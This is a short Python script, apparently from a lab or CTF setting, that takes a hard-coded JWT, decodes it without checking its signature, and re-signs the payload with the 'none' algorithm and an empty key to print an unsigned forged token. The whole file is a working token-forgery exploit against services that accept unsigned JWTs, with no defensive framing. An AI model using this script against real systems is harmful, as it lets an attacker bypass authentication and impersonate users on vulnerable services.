import jwt

jwtToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJleHAiOjE3MzgzOTU3OTF9.C0WcCxWNJFkvaOAdlOgWcczvOgNEtGLqX0_q__hqtIo'
decodedToken = jwt.decode(jwtToken, verify=False)  					

# decode the token before encoding with type 'None'
noneEncoded = jwt.encode(decodedToken, key='', algorithm=None)

print(noneEncoded.decode())